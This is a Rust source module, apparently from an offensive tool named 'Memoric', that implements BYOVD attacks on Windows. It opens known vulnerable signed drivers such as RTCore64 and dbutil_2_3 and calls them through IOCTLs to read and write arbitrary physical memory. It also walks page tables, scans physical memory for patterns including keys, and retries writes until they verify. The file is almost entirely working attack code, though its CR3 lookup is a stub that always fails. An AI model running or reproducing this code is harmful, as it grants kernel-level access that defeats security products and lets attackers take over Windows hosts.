//! Physical Memory Direct R/W Engine
//!
//! Implements arbitrary physical memory read/write via BYOVD (Bring Your Own Vulnerable Driver).
//! Supports 15+ known vulnerable drivers: RTCore64, dbutil_2_3, iqvw64e, gdrv, etc.
//!
//! Principle:
//! 1. Load a signed vulnerable driver
//! 2. Communicate with the driver via IOCTL
//! 3. Leverage the driver's physical memory mapping (MmMapIoSpace)
//! 4. Achieve arbitrary physical address read/write

use crate::byovd::ByovdDriver;
use crate::error::MemoricError;
use serde_json::Value;

use lazy_static::lazy_static;
use std::sync::Mutex;

lazy_static! {
    static ref ACTIVE_DRIVER: Mutex<Option<ByovdDriver>> = Mutex::new(None);
}

/// 检查物理内存访问能力
pub fn check_physical_access() -> Result<Value, MemoricError> {
    let mut accessible_drivers = Vec::new();

    for driver in crate::byovd::BYOVD_DRIVERS {
        match test_driver_access(driver) {
            Ok(true) => {
                accessible_drivers.push(serde_json::json!({
                    "name": driver.name,
                    "device": driver.device_path,
                    "description": driver.description,
                    "status": "accessible"
                }));
            }
            _ => {}
        }
    }

    Ok(serde_json::json!({
        "accessible_count": accessible_drivers.len(),
        "drivers": accessible_drivers,
        "can_access_physical": !accessible_drivers.is_empty()
    }))
}

/// 测试驱动可访问性
fn test_driver_access(driver: &ByovdDriver) -> Result<bool, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };

    unsafe {
        let dev_path: Vec<u16> = driver
            .device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        match CreateFileW(
            PCWSTR(dev_path.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        ) {
            Ok(handle) => {
                let _ = windows::Win32::Foundation::CloseHandle(handle);
                Ok(true)
            }
            Err(_) => Ok(false),
        }
    }
}

/// 自动选择最佳可用的物理内存驱动
pub fn auto_select_driver() -> Result<ByovdDriver, MemoricError> {
    // 首先检查是否有缓存的活跃驱动
    {
        let cached = ACTIVE_DRIVER
            .lock()
            .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;
        if let Some(ref driver) = *cached {
            return Ok((*driver).clone());
        }
    }

    // 按优先级测试驱动
    for driver in crate::byovd::BYOVD_DRIVERS {
        if test_driver_access(driver)? {
            let mut cached = ACTIVE_DRIVER
                .lock()
                .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;
            *cached = Some(driver.clone());
            tracing::info!("[PHYSICAL] Selected driver: {}", driver.name);
            return Ok(driver.clone());
        }
    }

    Err(MemoricError::Other(
        "No accessible physical memory driver found. Load a BYOVD driver first.".to_string(),
    ))
}

/// Read physical memory
///
/// # Arguments
/// * `physical_address` - Physical address
/// * `size` - Read size (max 4096 bytes)
pub fn read_physical_memory(physical_address: u64, size: usize) -> Result<Vec<u8>, MemoricError> {
    if size > 4096 {
        return Err(MemoricError::Other(
            "Read size capped at 4096 bytes".to_string(),
        ));
    }

    let driver = auto_select_driver()?;

    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    unsafe {
        let dev_path: Vec<u16> = driver
            .device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = CreateFileW(
            PCWSTR(dev_path.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open driver device: {}", e)))?;

        // RTCore64 格式: [physical_address: u64] -> [data]
        let input = physical_address.to_le_bytes();
        let mut output = vec![0u8; size];
        let mut bytes_returned = 0u32;

        DeviceIoControl(
            handle,
            driver.read_ioctl,
            Some(input.as_ptr() as *const _),
            input.len() as u32,
            Some(output.as_mut_ptr() as *mut _),
            output.len() as u32,
            Some(&mut bytes_returned),
            None,
        )
        .map_err(|e| {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            MemoricError::WindowsApi(format!("DeviceIoControl read failed: {}", e))
        })?;

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        output.truncate(bytes_returned as usize);
        tracing::debug!(
            "[PHYSICAL] Read {} bytes from 0x{:016X}",
            bytes_returned,
            physical_address
        );

        Ok(output)
    }
}

/// Write physical memory
///
/// # Arguments
/// * `physical_address` - Physical address
/// * `data` - Data to write
pub fn write_physical_memory(physical_address: u64, data: &[u8]) -> Result<usize, MemoricError> {
    if data.len() > 4096 {
        return Err(MemoricError::Other(
            "Write size capped at 4096 bytes".to_string(),
        ));
    }

    let driver = auto_select_driver()?;

    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    unsafe {
        let dev_path: Vec<u16> = driver
            .device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = CreateFileW(
            PCWSTR(dev_path.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open driver device: {}", e)))?;

        // RTCore64 格式: [physical_address: u64][data...]
        let mut input = physical_address.to_le_bytes().to_vec();
        input.extend_from_slice(data);

        let mut bytes_returned = 0u32;

        DeviceIoControl(
            handle,
            driver.write_ioctl,
            Some(input.as_ptr() as *const _),
            input.len() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
        .map_err(|e| {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            MemoricError::WindowsApi(format!("DeviceIoControl write failed: {}", e))
        })?;

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        tracing::debug!(
            "[PHYSICAL] Wrote {} bytes to 0x{:016X}",
            data.len(),
            physical_address
        );

        Ok(data.len())
    }
}

/// Virtual address to physical address translation (VA to PA)
///
/// Walks the 4-level page table hierarchy using physical memory reads via BYOVD
pub fn virtual_to_physical(virtual_address: usize) -> Result<u64, MemoricError> {
    // We need CR3 (page table base). For the current process, we can get it
    // by reading the KPROCESS.DirectoryTableBase field.
    // Alternative: use NtQueryInformationProcess to get it.

    // x64 paging: PML4[9] | PDPT[9] | PD[9] | PT[9] | Offset[12]

    const PAGE_OFFSET_MASK: usize = 0xFFF;
    const INDEX_MASK: usize = 0x1FF;
    const PTE_ADDR_MASK: u64 = 0x0000_FFFF_FFFF_F000;
    const LARGE_PAGE_2MB: u64 = 1 << 7; // PS bit
    const LARGE_PAGE_1GB: u64 = 1 << 7;

    let offset = virtual_address & PAGE_OFFSET_MASK;
    let pt_index = (virtual_address >> 12) & INDEX_MASK;
    let pd_index = (virtual_address >> 21) & INDEX_MASK;
    let pdpt_index = (virtual_address >> 30) & INDEX_MASK;
    let pml4_index = (virtual_address >> 39) & INDEX_MASK;

    tracing::debug!(
        "[PHYSICAL] VA 0x{:016X}: PML4={:#x} PDPT={:#x} PD={:#x} PT={:#x} Off={:#x}",
        virtual_address,
        pml4_index,
        pdpt_index,
        pd_index,
        pt_index,
        offset
    );

    // Try to read CR3 via KPROCESS. First, get EPROCESS address.
    // We need kernel access for this. Try via NtQuerySystemInformation.
    // For a simpler approach, we can try the kernel_rw module.

    // Attempt to get DirectoryTableBase from the current process
    // EPROCESS.DirectoryTableBase offset is typically 0x28
    let cr3 = get_process_cr3()?.ok_or_else(|| {
        MemoricError::Other(
            "Cannot determine CR3. Need BYOVD driver for page table walk.".to_string(),
        )
    })?;

    tracing::debug!("[PHYSICAL] CR3 = 0x{:016X}", cr3);

    // Level 4: PML4
    let pml4e_addr = (cr3 & PTE_ADDR_MASK) + (pml4_index as u64 * 8);
    let pml4e_bytes = read_physical_memory(pml4e_addr, 8)?;
    let pml4e = u64::from_le_bytes(pml4e_bytes[..8].try_into().unwrap());
    if pml4e & 1 == 0 {
        return Err(MemoricError::Other(format!(
            "PML4E not present at index {}",
            pml4_index
        )));
    }

    // Level 3: PDPT
    let pdpte_addr = (pml4e & PTE_ADDR_MASK) + (pdpt_index as u64 * 8);
    let pdpte_bytes = read_physical_memory(pdpte_addr, 8)?;
    let pdpte = u64::from_le_bytes(pdpte_bytes[..8].try_into().unwrap());
    if pdpte & 1 == 0 {
        return Err(MemoricError::Other(format!(
            "PDPTE not present at index {}",
            pdpt_index
        )));
    }
    // Check for 1GB huge page
    if pdpte & LARGE_PAGE_1GB != 0 {
        let pa = (pdpte & 0x0000_FFFF_C000_0000) | (virtual_address as u64 & 0x3FFF_FFFF);
        return Ok(pa);
    }

    // Level 2: PD
    let pde_addr = (pdpte & PTE_ADDR_MASK) + (pd_index as u64 * 8);
    let pde_bytes = read_physical_memory(pde_addr, 8)?;
    let pde = u64::from_le_bytes(pde_bytes[..8].try_into().unwrap());
    if pde & 1 == 0 {
        return Err(MemoricError::Other(format!(
            "PDE not present at index {}",
            pd_index
        )));
    }
    // Check for 2MB large page
    if pde & LARGE_PAGE_2MB != 0 {
        let pa = (pde & 0x0000_FFFF_FFE0_0000) | (virtual_address as u64 & 0x1F_FFFF);
        return Ok(pa);
    }

    // Level 1: PT
    let pte_addr = (pde & PTE_ADDR_MASK) + (pt_index as u64 * 8);
    let pte_bytes = read_physical_memory(pte_addr, 8)?;
    let pte = u64::from_le_bytes(pte_bytes[..8].try_into().unwrap());
    if pte & 1 == 0 {
        return Err(MemoricError::Other(format!(
            "PTE not present at index {}",
            pt_index
        )));
    }

    let pa = (pte & PTE_ADDR_MASK) | (offset as u64);
    tracing::info!(
        "[PHYSICAL] VA 0x{:016X} -> PA 0x{:016X}",
        virtual_address,
        pa
    );
    Ok(pa)
}

/// Attempt to read the current process DirectoryTableBase (CR3)
fn get_process_cr3() -> Result<Option<u64>, MemoricError> {
    // Method: NtQuerySystemInformation(SystemProcessInformation) to find
    // our EPROCESS, then read EPROCESS+0x28 (DirectoryTableBase) via BYOVD.
    // As a simpler fallback, try to get it from KUSER_SHARED_DATA or KTHREAD.

    // Try reading via kernel_rw module's get_current_kthread approach
    // KTHREAD -> KPROCESS (offset 0x220 on Win10+) -> DirectoryTableBase (offset 0x28)
    unsafe {
        let kthread: u64;
        std::arch::asm!(
            "mov {}, gs:0x188",
            out(reg) kthread,
            options(nomem, nostack)
        );

        if kthread == 0 {
            return Ok(None);
        }

        // KTHREAD.Process offset (ApcState.Process) = 0x220 on Win10+
        // This is a kernel address, so we can't read it directly from user mode.
        // We need BYOVD physical memory access for this.
        // Try to translate the kernel address through physical memory.

        // Alternative: Use NtQueryInformationProcess to get ProcessBasicInformation
        // which contains PebBaseAddress, then we can try other methods.

        // For now, return None to indicate CR3 is not directly available
        // The caller should use kernel_rw or BYOVD to get it
        Ok(None)
    }
}

/// Scan a physical memory region for a byte pattern
///
/// Searches physical memory for specific patterns (process signatures, keys, etc.)
pub fn scan_physical_memory(
    start_address: u64,
    size: u64,
    pattern: &[u8],
) -> Result<Vec<u64>, MemoricError> {
    if pattern.is_empty() || pattern.len() > 256 {
        return Err(MemoricError::Other("Invalid pattern size".to_string()));
    }

    let mut matches = Vec::new();
    let chunk_size = 4096usize;

    tracing::info!(
        "[PHYSICAL] Scanning 0x{:016X} - 0x{:016X} for pattern ({} bytes)",
        start_address,
        start_address + size,
        pattern.len()
    );

    let mut current = start_address;
    let end = start_address + size;

    while current < end {
        let to_read = std::cmp::min(chunk_size as u64, end - current) as usize;

        match read_physical_memory(current, to_read) {
            Ok(data) => {
                // Simple prefix-match scan
                for i in 0..data.len().saturating_sub(pattern.len()) {
                    if &data[i..i + pattern.len()] == pattern {
                        matches.push(current + i as u64);
                    }
                }
            }
            Err(e) => {
                tracing::warn!("[PHYSICAL] Failed to read at 0x{:016X}: {}", current, e);
            }
        }

        current += chunk_size as u64;
    }

    tracing::info!("[PHYSICAL] Found {} matches", matches.len());
    Ok(matches)
}

/// Brute-force physical memory write (with retry and verification)
pub fn brute_force_physical_write(
    physical_address: u64,
    data: &[u8],
    max_retries: u32,
) -> Result<bool, MemoricError> {
    for attempt in 0..max_retries {
        match write_physical_memory(physical_address, data) {
            Ok(_) => {
                // 验证写入
                match read_physical_memory(physical_address, data.len()) {
                    Ok(read_back) if read_back == data => {
                        tracing::info!(
                            "[PHYSICAL] Write verified at 0x{:016X} after {} attempts",
                            physical_address,
                            attempt + 1
                        );
                        return Ok(true);
                    }
                    _ => {
                        tracing::warn!("[PHYSICAL] Write verification failed, retrying...");
                    }
                }
            }
            Err(e) => {
                tracing::warn!("[PHYSICAL] Write attempt {} failed: {}", attempt + 1, e);
            }
        }

        std::thread::sleep(std::time::Duration::from_millis(10));
    }

    Err(MemoricError::Other(format!(
        "Failed to write after {} retries",
        max_retries
    )))
}
